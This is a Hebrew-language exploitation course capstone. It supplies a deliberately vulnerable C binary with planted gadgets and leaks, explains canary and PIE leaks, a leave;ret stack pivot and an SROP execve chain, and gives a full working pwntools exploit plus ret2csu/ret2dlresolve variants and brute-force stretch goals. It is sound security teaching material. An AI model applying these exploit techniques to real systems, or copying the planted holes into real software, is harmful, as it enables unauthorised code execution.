## פרויקט - שרשרת ROP מורכבת: פיבוט ו-SROP

לאורך פרק 6 פירקנו את הטכניקות המתקדמות של ROP אחת-אחת: הזזת מחסנית - stack pivot, הגאדג'ט האוניברסלי ret2csu, קריאת סיגנל מזויפת - SROP, ופתרון סמלים בכוח - ret2dlresolve. עד עכשיו כל טכניקה הודגמה על בינארי שנבנה בדיוק בשבילה, לרוב עם כמה הגנות כבויות כדי שנוכל להתרכז ברעיון. עכשיו הגיע הרגע לחבר הכל. בפרויקט הזה תקבלו בינארי אחד קשוח - Full RELRO, NX, PIE, קנרי, וחלון גלישה זעיר - שבו אף טכניקה בודדת לא מספיקה. תצטרכו לשרשר כמה מהן: פיבוט שמעביר אתכם לאזור עבודה גדול, ומעליו אחת מהטכניקות שמייצרת shell בלי שום כתובת libc קבועה. זה בדיוק סוג האתגר שתפגשו ב-CTF רציני ובעבודת מחקר אמיתית.

## מה בונים ומה המטרה

תקבלו קוד מקור של בינארי קטן, תקמפלו אותו עם כל ההגנות דלוקות, ותכתבו exploit שפותח shell אינטראקטיבי. הקריטריון להצלחה חד משמעי:

```text
$ python3 exploit.py
[+] stage    @ 0x5637b1c2e040
[+] PIE base @ 0x5637b1c2c000
[+] canary   @ 0x8f3a1e77c4b90600
[*] pivot -> stage, firing SROP frame
[*] Switching to interactive mode
$ id
uid=1000(pwn) gid=1000(pwn) groups=1000(pwn)
$ cat flag.txt
VR{pivot_plus_srop_needs_no_libc_at_all}
```

שימו לב לפרט אחד קריטי בפלט: אין שם שורת "libc זוהתה". בניגוד לפרויקט של פרק 4, כאן ה-exploit לא מדליף שום כתובת libc ולא תלוי בגרסת libc בכלל. זו לא במקרה - זו כל הנקודה של הנתיב שנבחר. הטכניקה SROP מאפשרת לבצע `execve("/bin/sh", 0, 0)` ישירות דרך קריאת מערכת, בלי לדעת איפה libc יושבת ובלי בכלל להיזקק לה.

## הנחות הגנה - protections

לפני שכותבים שורת exploit אחת חייבים לדעת בדיוק נגד מה עומדים. הבינארי מקומפל כך שכל ההגנות דלוקות, וזה מה שהופך אותו לקשה:

- **מנגנון NX** דלוק. המחסנית לא ניתנת להרצה, ולכן הזרקת shellcode לא באה בחשבון. כל הפתרון הוא ROP טהור.
- **מנגנון PIE** דלוק. גם הבינארי עצמו נטען בכתובת אקראית, ולכן אין שום כתובת קוד או נתונים קבועה. חייבים לדלוף לפחות כתובת אחת מהבינארי כדי לחשב את הבסיס שלו.
- **קנרי - canary** דלוק (מקמפלים עם `-fstack-protector-all`). כל גלישה שמגיעה מעבר לחוצץ אל כתובת החזרה חוצה את הקנרי, וחייבת לכתוב אותו נכון בחזרה - אחרת התוכנית מתה ב-`__stack_chk_fail`. לכן נצטרך גם דליפת קנרי.
- **מנגנון RELRO** במצב Full. ה-GOT נכתב פעם אחת בטעינה והופך לקריאה בלבד. אי אפשר לדרוס אותו, וכפי שנראה בהמשך - זה גם מה שמוציא מהמשחק את ret2dlresolve הקלאסי.
- **חלון גלישה זעיר.** הקריאה הפגיעה נותנת לכם לדרוס בדיוק את הקנרי, את ה-`saved rbp`, ואת כתובת החזרה - ואפס בתים אחריהם. אין מקום לשרשרת. זו הסיבה שאתם חייבים פיבוט.

התמונה ברורה: יש כאן קנרי לדלוף, בסיס PIE לדלוף, חלון גלישה שבו נכנס רק פיבוט אחד, ואזור עבודה גדול וכתיב שאליו נזיז את המחסנית. מכאן בונים את שרשרת המטרה בנחת.

## קוד המקור של הבינארי - vulnerable binary

הנה הבינארי המלא. שמרו אותו כ-`chain.c`:

```c
// chain.c - קפסטון פרק 6: פיבוט + SROP
// Build (Full RELRO, NX, PIE, Canary):
//   gcc -O0 -fstack-protector-all -fpie -pie \
//       -Wl,-z,relro,-z,now -o chain chain.c
#include <stdio.h>
#include <string.h>
#include <unistd.h>

// גאדג'טים מובטחים. בבינארי דינמי אין הוראת syscall חשופה ב-.text
// (הקריאות למערכת עוברות דרך libc), וגם pop rax נקי לא תמיד קיים.
// לכן אנחנו מקבעים אותם בכתובת קבועה (יחסית לבסיס PIE), בדיוק כמו
// שקיבענו pop rdi בפרויקט של פרק 4. בבינארי אמיתי תחפשו אותם ב-libc.
__asm__(
    ".intel_syntax noprefix\n"
    ".global g_syscall\n"
    "g_syscall:\n"
    "    syscall\n"
    "    ret\n"
    ".global g_pop_rax\n"
    "g_pop_rax:\n"
    "    pop rax\n"
    "    ret\n"
    ".att_syntax prefix\n"
);

char stage[0x800];               // אזור bss גדול - אזור הנחיתה של הפיבוט

void vuln(void) {
    char buf[64];

    // (1) דליפת הכתובת של אזור הבמה -> מגלה את בסיס ה-PIE.
    printf("stage @ %p\n", (void *)stage);

    // (2) ממלאים את הבמה בשרשרת המלאה (עד 0x800 בתים בכתובת ידועה).
    read(0, stage, sizeof(stage));

    // (3) "פיצ'ר" השם - למעשה דליפת קנרי. אנחנו שולחים בדיוק מספיק בתים
    //     כדי לדרוס את בית ה-null התחתון של הקנרי, ו-puts מדפיס את השאר.
    printf("name> ");
    read(0, buf, 80);            // מגיע עד הקנרי, לא עד כתובת החזרה
    puts(buf);

    // (4) חלון הגלישה הזעיר: בדיוק עד סוף כתובת החזרה, אף בית מעבר.
    //     buf(64) + ריפוד(8) + קנרי(8) + saved rbp(8) + return addr(8).
    printf("> ");
    read(0, buf, 96);           // אין מקום לשרשרת -> חייבים פיבוט
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin,  NULL, _IONBF, 0);
    vuln();
    return 0;
}
```

הקומפילציה, בדיוק עם ההגנות שהגדרנו:

```bash
gcc -O0 -fstack-protector-all -fpie -pie -Wl,-z,relro,-z,now -o chain chain.c
```

## אימות ההגנות והגאדג'טים

לפני שכותבים exploit, מוודאים שהבינארי אכן קשוח כמו שתכננו:

```bash
$ checksec --file=./chain
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```

עכשיו מאתרים את הרכיבים שנצטרך. הכתובות כאן הן היסטים יחסיים לבסיס ה-PIE (כי הבינארי הוא PIE), והן ישתנו אצלכם - קחו אותן מהפלט שלכם:

```bash
$ ROPgadget --binary chain | grep -E ': syscall ; ret$| : pop rax ; ret$'
0x00000000000011c6 : syscall ; ret
0x00000000000011c9 : pop rax ; ret

$ ROPgadget --binary chain | grep ': leave ; ret$'
0x0000000000001238 : leave ; ret

# מחפשים גאדג'טים נוחים ל-rsi/rdx - ובכוונה אין כאלה:
$ ROPgadget --binary chain | grep -E ': pop rsi ; ret$| : pop rdx ; ret$'
$
```

השורה האחרונה היא הלב של האתגר. אין `pop rsi ; ret` ואין `pop rdx ; ret`, אז אי אפשר פשוט לבנות `execve` ידני שמסדר את שלושת הארגומנטים בזה אחר זה. יש לנו `syscall`, יש דרך לשלוט ב-`rax`, אבל אין דרך נוחה לסדר את `rsi` ואת `rdx`. זה בדיוק המצב שבו SROP זורח: הוא משחזר את **כל** האוגרים בבת אחת ממסגרת שאנחנו מניחים על המחסנית.

## התוכנית ההתקפית

הרעיון מתחלק לארבעה שלבים, כולם באותה הרצה של אותו תהליך (חשוב - ASLR מגריל מחדש בכל תהליך, ובלי לדלוף מחדש הבסיס ישתנה):

1. **דליפת PIE.** התוכנית מדפיסה לנו את הכתובת של `stage`. מכיוון ש-`stage` יושב בהיסט קבוע מבסיס הבינארי, זה נותן לנו את בסיס ה-PIE, ואיתו את הכתובות של `g_syscall`, `g_pop_rax` וגאדג'ט הפיבוט.
2. **מילוי הבמה.** כותבים את השרשרת המלאה (כולל מסגרת ה-SROP והמחרוזת `/bin/sh`) לתוך `stage`, שכתובתו כבר ידועה לנו.
3. **דליפת קנרי.** דרך "פיצ'ר השם" מדליפים את הקנרי, כדי שנוכל לכתוב אותו נכון בגלישה.
4. **פיבוט וירי.** הגלישה הזעירה דורסת את `saved rbp` בכתובת הבמה ואת כתובת החזרה בגאדג'ט `leave ; ret`. כשהפונקציה חוזרת, המחסנית מוזזת אל הבמה והשרשרת רצה.

איך נראית הבמה שאנחנו כותבים ל-`stage`? זכרו את הטריק מפרק 6.1: הפיבוט עם `leave ; ret` כולל `pop rbp` כפול שבולע את 8 הבתים הראשונים. לכן השרשרת האמיתית מתחילה ב-`stage+8`, ואת 8 הבתים הראשונים ב-`stage+0` ננצל לטובתנו - נשים שם דווקא את המחרוזת `/bin/sh`:

```text
אזור הבמה (stage) אחרי שכתבנו אליו:
+-----------------------------------------+
| stage+0x00 : "/bin/sh\0"                |  <-- גם ריפוד (נבלע ב-pop rbp) וגם המחרוזת
+-----------------------------------------+
| stage+0x08 : g_pop_rax                  |  <-- כאן מתחילה השרשרת (ret קופץ לכאן)
+-----------------------------------------+
| stage+0x10 : 15                         |  <-- rax = 15  (מספר rt_sigreturn)
+-----------------------------------------+
| stage+0x18 : g_syscall                  |  <-- syscall מפעיל sigreturn
+-----------------------------------------+
| stage+0x20 : SigreturnFrame (0xf8 בתים) |  <-- הקרנל משחזר מכאן את כל האוגרים
|             rax=59, rdi=stage, rsi=0,   |
|             rdx=0, rip=g_syscall        |
+-----------------------------------------+
```

וזרימת השליטה, צעד אחר צעד, אחרי שהפונקציה `vuln` חוזרת:

```text
vuln: leave ; ret     -> rbp = stage,  קופץ ל-leave;ret הגאדג'ט
leave;ret (הגאדג'ט)   -> rsp = stage ; pop rbp בולע את "/bin/sh" ; rsp = stage+8
ret                   -> קופץ אל [stage+8] = g_pop_rax
g_pop_rax             -> rax = 15 ; קופץ ל-g_syscall ; rsp = stage+0x20
g_syscall (rax=15)    -> rt_sigreturn קורא מסגרת מ-rsp = stage+0x20
sigreturn             -> טוען rax=59, rdi=stage, rsi=0, rdx=0, rip=g_syscall
g_syscall (rax=59)    -> execve("/bin/sh", 0, 0)  ->  shell
```

שימו לב לאלגנטיות: אותו גאדג'ט `syscall ; ret` משמש פעמיים - פעם ראשונה כדי לזמן את `rt_sigreturn` (עם `rax=15`), ופעם שנייה כ-`execve` (כש-`rax=59` נטען מתוך המסגרת). ושימו לב לעוד יופי - `execve` היא קריאת מערכת, אז אין כאן שום `movaps` ואין כאב ראש של יישור מחסנית ל-16 בתים, בניגוד ל-`system` של libc.

## דרישות הפרויקט - requirements

ה-exploit הסופי שתגישו חייב:

- למצוא את היסטי החולשה (קנרי, `saved rbp`, כתובת חזרה) עם `cyclic` ו/או פירוק ב-gdb, לא בניחוש.
- לדלוף את כתובת `stage` ולחשב ממנה את בסיס ה-PIE, ומשם את כל הכתובות שבבינארי.
- לדלוף את הקנרי ולכתוב אותו נכון בגלישה, כך שבדיקת הקנרי עוברת.
- לבצע פיבוט מהחלון הזעיר אל הבמה עם `leave ; ret`.
- להריץ מהבמה שרשרת שפותחת shell **בלי שום כתובת libc** - הנתיב המרכזי הוא SROP.
- לפתוח shell אינטראקטיבי אמיתי ולהריץ בו לפחות שתי פקודות.

בנוסף, מומלץ בחום ליישם לפחות אחד מהנתיבים החלופיים (ret2csu או ret2dlresolve) כדי להוכיח שהבנתם למה בחרנו דווקא ב-SROP.

## אבני דרך - milestones

אל תנסו לכתוב את הכל במכה אחת. עברו דרך אבני הדרך אחת-אחת, וודאו שכל אחת עובדת לפני שממשיכים.

### אבן דרך 1 - הגנות והיסטים

מריצים `checksec`, מוודאים את התמונה, ומפרקים את `vuln` כדי לראות איפה יושב הקנרי:

```bash
gdb ./chain
pwndbg> disass vuln
# מחפשים:  lea rax, [rbp-0x50]   (זה buf)   ו-   mov rax, [rbp-8]  (זה הקנרי)
```

מהפירוק רואים ש-`buf` מתחיל ב-`rbp-0x50` (היסט 80) והקנרי ב-`rbp-8`. כלומר מ-`buf` עד הקנרי יש `0x50-8 = 0x48 = 72` בתים, אחריהם 8 בתים קנרי, 8 בתים `saved rbp`, ו-8 בתים כתובת חזרה. לכן:

```text
buf[0..71]   : 72 בתים ריפוד (החוצץ + ריפוד יישור)
buf[72..79]  : הקנרי
buf[80..87]  : saved rbp
buf[88..95]  : return addr
```

חלון הגלישה בקריאה (4) הוא 96 בתים בדיוק - עד סוף כתובת החזרה, אף בית מעבר. אין לאן לדחוס שרשרת, וזו ההוכחה שאתם חייבים פיבוט.

### אבן דרך 2 - דליפת PIE וחישוב הבסיס

קוראים את הכתובת שהתוכנית מדפיסה ומחשבים בסיס:

```python
io.recvuntil(b'stage @ ')
stage = int(io.recvline().strip(), 16)
elf.address = stage - elf.symbols['stage']    # מציב את הבסיס לכל הסמלים
log.success('stage    @ %#x', stage)
log.success('PIE base @ %#x', elf.address)
```

תוודאו שהבסיס מסתיים ב-`000` (מיושר לעמוד). אם לא - קראתם שורה לא נכונה.

### אבן דרך 3 - דליפת הקנרי

הקנרי מסתיים תמיד בבית `\x00` תחתון (מיטיגציה נגד דליפה במחרוזות). הטריק: שולחים בדיוק 73 בתים - 72 ריפוד ועוד בית אחד שדורס את בית ה-null התחתון של הקנרי. עכשיו `puts` לא נעצר שם, וממשיך להדפיס את 7 בתי הקנרי הגבוהים:

```python
io.recvuntil(b'name> ')
io.send(b'A' * 73)                 # 72 ריפוד + בית שדורס את null התחתון של הקנרי
resp = io.recvline()               # 'A'*73 + canary[1..7] + ...
canary = u64(b'\x00' + resp[73:80])
log.success('canary @ %#x', canary)
```

מרכיבים את הקנרי בחזרה עם `\x00` תחתון קבוע ועם 7 הבתים שדלפו. הבסיס לוגי: הקנרי הוא ערך 64 ביט little-endian שהבית התחתון שלו 0, אז 7 הבתים העליונים הם החתימה שדלפנו.

### אבן דרך 4 - פיבוט וירי SROP

בונים את הבמה ואת מטען הפיבוט, שולחים, ומקבלים shell. זה הפתרון המלא בסוף העמוד. תבנו אותו בהדרגה: קודם תוודאו ב-gdb שהפיבוט מנחית את `rsp` ב-`stage+8` (שימו breakpoint על `g_pop_rax` וראו את `rsp`), ורק אז תוסיפו את מסגרת ה-SROP.


## נתיב חלופי - ret2csu

מה עושים אם אין `syscall` נוח, אבל הבינארי עדיין מכיל את `__libc_csu_init` (נכון לגרסאות glibc קטנות מ-2.34)? כאן נכנס ret2csu. תזכורת קצרה על שני הגאדג'טים שהוא נותן לנו:

```asm
; gadget1 - טוען שישה אוגרים מהמחסנית
pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret

; gadget2 - מעביר אותם לאוגרי ארגומנטים וקורא לפונקציה
mov rdx, r15 ; mov rsi, r14 ; mov edi, r13d ; call [r12 + rbx*8]
```

מסדרים ב-gadget1 את `rbx=0`, `rbp=1` (כדי שהלולאה שאחרי ה-`call` תיפול החוצה), `r12` יצביע לכתובת של הפונקציה שנרצה לקרוא, `r13`=ארגומנט ראשון, `r14`=שני, `r15`=שלישי. אחרי ה-`call` השרשרת ממשיכה. בודקים שהגאדג'טים קיימים:

```bash
ROPgadget --binary chain | grep 'mov rdx, r15 ; mov rsi, r14'
ROPgadget --binary chain | grep 'pop rbx ; pop rbp ; pop r12'
```

יש כאן מלכודת חשובה: `mov edi, r13d` טוען רק את 32 הביטים התחתונים של `rdi`. תחת PIE הכתובת של `/bin/sh` בבמה היא 64 ביט, אז ret2csu **לא** נוח לסידור `rdi` לכתובת מלאה. לכן הוא מבריק לסידור `rsi` ו-`rdx`, אבל פחות ל-`rdi`.

איך בכל זאת מנצלים אותו כאן? במקום `execve`, משתמשים ב-ret2csu כדי לקרוא ל-`write(1, got_entry, 8)` - ה-`rdi=1` נכנס יפה ב-32 ביט, ותחת Full RELRO ה-GOT כבר מכיל כתובות libc אמיתיות (הן נכתבו בטעינה). כך מדליפים כתובת libc, מחשבים בסיס, ובשלב שני קוראים ל-`system("/bin/sh")`:

```text
פיבוט -> ret2csu: write(1, elf.got['read'], 8)  -> דליפת libc
      -> חוזרים ל-vuln / למחסנית מבוקרת
      -> שלב שני: system("/bin/sh")  (עם gadget pop rdi שנצטרך למצוא)
```

זה עובד, אבל שימו לב להבדל המהותי: הנתיב הזה **תלוי libc**. הוא דורש שתדעו באיזו גרסת libc מדובר כדי לחשב את ההיסט ל-`system`. הנתיב SROP, לעומתו, לא נוגע ב-libc בכלל. זו בדיוק הסיבה ש-SROP הוא הנתיב המרכזי כאן, ו-ret2csu הוא תרגיל השוואה מצוין.

## המגבלה של Full RELRO על ret2dlresolve

אולי שאלתם את עצמכם: למה לא ret2dlresolve? הרי זו בדיוק הטכניקה שנועדה לפתור סמלים בלי דליפת libc. התשובה היא ההגנה Full RELRO.

הטכניקה ret2dlresolve הקלאסית מזייפת מבני `Elf64_Rela` ו-`Elf64_Sym` ומחרוזת שם, ואז קופצת אל `PLT[0]` - סטאב ה-resolver שדוחף אינדקס ומקפיץ ל-`_dl_runtime_resolve`. כל זה מסתמך על **קישור עצל - lazy binding**: על כך שה-PLT באמת עובר דרך ה-resolver בזמן ריצה. תחת Full RELRO (שמופעל אצלנו עם `-z now`), הקישור מתבצע כולו בטעינה, ה-`.got.plt` מלא ומוקפא לקריאה בלבד, והמסלול דרך `_dl_runtime_resolve` פשוט לא בשימוש. במילים אחרות: ב-`chain` שלנו ret2dlresolve הקלאסי מת.

מי שרוצה בכל זאת לתרגל את הטכניקה - קמפלו וריאנט עם קישור עצל (Partial RELRO), רצוי בלי PIE כדי שכתובות ה-`.bss` יהיו קבועות:

```bash
gcc -O0 -fstack-protector-all -no-pie -Wl,-z,relro,-z,lazy -o chain_dl chain.c
```

ואז pwntools בונה את המטען כמעט לבד:

```python
elf = ELF('./chain_dl')
rop = ROP(elf)
dl  = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])
rop.read(0, dl.data_addr)     # כותבים את המבנים המזויפים לכתובת bss ידועה
rop.ret2dlresolve(dl)
raw_rop = rop.chain()
```

תשלבו את זה עם הפיבוט בדיוק כמו את שרשרת ה-SROP: קודם ממלאים את הבמה עם `raw_rop` ועם `dl.payload`, ואז מפעילים את הפיבוט. זו הדרך הנכונה להוכיח שהבנתם גם את הטכניקה השלישית מהפרק.

## מלכודות נפוצות - common pitfalls

- **שכחתם את הריפוד של 8 הבתים בתחילת הבמה.** ה-`pop rbp` שבתוך ה-`leave` השני בולע את `stage+0`. אם שמתם שם את הגאדג'ט הראשון, הוא נבלע, וה-`ret` קופץ אל בתי `/bin/sh` - קריסה. אנחנו פותרים את זה בכך שהמחרוזת עצמה יושבת ב-`stage+0`, ולכן היא גם הריפוד וגם `/bin/sh`.
- **בית newline בכתובת שדלפה או בקנרי.** אם 7 בתי הקנרי מכילים במקרה `0x0a`, ה-`recvline` יחתוך אותם באמצע. זו אחת הסיבות לעטוף את כל ה-exploit בלולאת ניסיונות חוזרים (ראו מטרות מתיחה).
- **בלבול בין ה-rsp של המסגרת למיקום הקריאה.** ה-`rt_sigreturn` קורא את המסגרת מ-`rsp` **ברגע ה-syscall**. אצלנו זה `stage+0x20`, ולכן שם בדיוק המסגרת מתחילה. טעות של 8 בתים כאן = קריסה. אמתו ב-gdb: breakpoint על `g_syscall`, בדקו `rsp`.
- **הקריאה read לא מוסיפה null ולא עוצרת ב-newline.** השתמשו ב-`send` (לא `sendline`) בשליחת השרשראות והמטענים, כדי לשלוט בדיוק במספר הבתים ובלי newline מיותר שיזיז דברים.
- **הבמה חייבת להיכתב לפני הפיבוט.** הסדר תמיד: קודם ממלאים את `stage`, אחר כך מדליפים קנרי, ורק בסוף מפוצצים. אם תהפכו את הסדר, אין שרשרת לקפוץ אליה.
- **ערבוב ההגנות.** אם שכחתם `-z now`, קיבלתם Partial RELRO, וה-checksec לא יראה Full RELRO. אם שכחתם `-fstack-protector-all`, אין קנרי לדלוף והתרגיל מאבד חלק מהמורכבות. תמיד אמתו עם checksec לפני שמתחילים.

## מטרות מתיחה - stretch goals

השלמתם את הנתיב המרכזי? הנה איך לוקחים את הפרויקט לרמת מחקר אמיתי.

**מטרה 1 - בלי שום דליפה.** מחקו מהמקור את שורת `printf("stage @ %p")` ואת `puts(buf)`, קמפלו מחדש, ופתרו בלי דליפת PIE ובלי דליפת קנרי. עוטפים את הבינארי בשרת forking (הילדים יורשים מההורה גם את בסיס ה-ASLR וגם את הקנרי), ואז מפצחים בית-בית: מנחשים בית של הקנרי, ואם התהליך לא קרס - הבית נכון. 256 ניחושים כפול 8 בתים לקנרי, ואותו רעיון לביטים התחתונים של בסיס ה-PIE. זה ההבדל בין "יש דליפה" ל"אין דליפה" בעולם האמיתי.

**מטרה 2 - רק ret2csu, בלי גאדג'טים מובטחים.** מחקו את בלוק ה-`__asm__` וקמפלו על toolchain שעדיין פולט `__libc_csu_init`. עכשיו אין `g_syscall` ואין `g_pop_rax`, ותצטרכו לבנות את הכל מגאדג'טי ה-csu ומדליפת libc, כמתואר בנתיב החלופי. תסיימו עם `system("/bin/sh")` מלא.

**מטרה 3 - ret2dlresolve טהור.** ממשו את הווריאנט עם Partial RELRO ובלי PIE שתיארנו, כולל שילוב עם הפיבוט. תשוו לעצמכם: כמה בתים תפס המטען של ret2dlresolve לעומת מסגרת ה-SROP? מתי הייתם מעדיפים כל טכניקה?

**מטרה 4 - תקיפה מרחוק מול libc לא ידועה.** עטפו את הבינארי בשרת (למשל עם `socat`), החליפו `process` ב-`remote`, והוכיחו שנתיב ה-SROP עובד בלי שינוי גם כשאין לכם בכלל את קובץ ה-libc של השרת. זה היתרון הגדול של SROP: הוא לא נוגע ב-libc, אז הוא ניטרלי לחלוטין לגרסה.

**מטרה 5 - שרשרת SROP כפולה.** לפני ה-`execve`, השתמשו ב-SROP ראשון כדי לקרוא `mprotect` על אזור ולהפוך אותו לניתן להרצה, ואז SROP שני כדי לקפוץ ל-shellcode שכתבתם לשם. זה מראה ש-SROP הוא לא רק "פתיחת shell" אלא פרימיטיב כללי לשליטה מלאה על מצב האוגרים.

## פתרון ייחוס - reference exploit

אחרי שהתמודדתם לבד, הנה exploit מלא ורץ: פיבוט + SROP, בלי שום כתובת libc. השתמשו בו כדי להשוות לעצמכם, לא כדי לדלג על העבודה:

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./chain')
context.log_level = 'info'

CANARY_OFF = 72          # buf -> קנרי
LEAVE_RET  = 0x1238      # ROPgadget --binary chain | grep ': leave ; ret'  (היסט; אמתו)

def start():
    return process('./chain')        # להחלפה ב-remote(HOST, PORT) מול שרת

def exploit():
    io = start()

    # (1) דליפת PIE מתוך הכתובת של הבמה
    io.recvuntil(b'stage @ ')
    stage = int(io.recvline().strip(), 16)
    elf.address = stage - elf.symbols['stage']
    log.success('stage    @ %#x', stage)
    log.success('PIE base @ %#x', elf.address)

    g_syscall = elf.symbols['g_syscall']
    g_pop_rax = elf.symbols['g_pop_rax']
    leave_ret = elf.address + LEAVE_RET

    # (2) בונים ושולחים את הבמה: מחרוזת, הכנת rax=15, syscall, ומסגרת SROP
    frame = SigreturnFrame()
    frame.rax = constants.SYS_execve      # 59
    frame.rdi = stage                     # "/bin/sh" יושב ב-stage+0
    frame.rsi = 0
    frame.rdx = 0
    frame.rip = g_syscall
    frame.rsp = stage + 0x400

    chain  = b'/bin/sh\x00'               # stage+0  : מחרוזת + ריפוד לפיבוט
    chain += p64(g_pop_rax)               # stage+8
    chain += p64(15)                      # stage+16 : rax = 15
    chain += p64(g_syscall)               # stage+24 : syscall -> sigreturn
    chain += bytes(frame)                 # stage+32 : המסגרת
    io.send(chain)                        # ממלא את read(stage); חייב לקרות לפני "name> "

    # (3) דליפת קנרי דרך "פיצ'ר השם"
    io.recvuntil(b'name> ')
    io.send(b'A' * (CANARY_OFF + 1))      # דורס רק את בית ה-null התחתון של הקנרי
    resp = io.recvline()
    canary = u64(b'\x00' + resp[CANARY_OFF + 1: CANARY_OFF + 8])
    log.success('canary   @ %#x', canary)

    # (4) הגלישה הזעירה -> פיבוט אל הבמה
    io.recvuntil(b'> ')
    payload  = b'A' * CANARY_OFF          # 72 בתים ריפוד
    payload += p64(canary)                # מחזירים את הקנרי הנכון
    payload += p64(stage)                 # saved rbp -> הבמה (יעד הפיבוט)
    payload += p64(leave_ret)             # return addr -> leave ; ret
    io.send(payload)

    log.info('pivot -> stage, firing SROP frame')
    io.sendline(b'echo PWNED_$((21+21))') # בדיקת חיות
    if b'PWNED_42' in io.recvrepeat(0.5):
        log.success('shell!')
        io.interactive()
    else:
        log.failure('לא נפתח shell, בדקו את ההיסטים ואת מסגרת ה-SROP')
        io.close()

if __name__ == '__main__':
    exploit()
```

שימו לב לנקודת הסנכרון בקוד: הקריאה שממלאת את הבמה קורה **לפני** ההדפסה `name> `. לכן בפועל שולחים את `chain` מיד אחרי שקראנו את שורת `stage @`, ורק אז מחכים ל-`name> `. אם תבלבלו את הסדר, הבתים של הבמה ייבלעו בפרומפט הלא נכון. תמיד סנכרנו מול הפלט האמיתי של הבינארי, לא מול מה שנוח לכם להניח.

## קריטריוני הצלחה והגשה

מה שצריך להראות בסוף:

- **פתיחת shell אמינה** - exploit שמדליף PIE וקנרי, מבצע פיבוט, ופותח shell שבו הרצתם לפחות שתי פקודות (`id` ו-`cat flag.txt`).
- **הוכחת החלון הזעיר** - פלט gdb או פירוק שמראה שהגלישה מגיעה בדיוק עד כתובת החזרה, ושאין מקום לשרשרת בלי פיבוט.
- **פיבוט מאומת** - צילום מ-gdb שמראה את `rsp` נוחת ב-`stage+8` אחרי הפיבוט.
- **בלי libc** - הוכחה שהנתיב המרכזי (SROP) עובד בלי שום קובץ או כתובת libc. אם מימשתם גם את ret2csu, ציינו את ההבדל: זה תלוי libc וזה לא.
- **לפחות נתיב חלופי אחד** - ret2csu או ret2dlresolve, עם הסבר קצר למה בחרנו דווקא ב-SROP כנתיב המרכזי.

הגישו את קוד ה-C, את סקריפט ה-exploit, ותיעוד קצר: מה ניסיתם, איפה נתקעתם, ואיך פתרתם. אם ניגשתם למטרת מתיחה - צרפו גם אותה עם הסבר.

זה הקפסטון של פרק 6. אם הגעתם עד כאן עם shell, אתם כבר לא "מריצים exploit" - אתם **מרכיבים** אחד מטכניקות שאתם בוחרים לפי מה שהבינארי מרשה. פיבוט כדי לקנות מקום, ו-SROP כדי לקנות שליטה מלאה על האוגרים בלי להסתמך על כלום חיצוני. זה בדיוק האופן שבו נראה ניצול חולשות ברמה מקצועית.
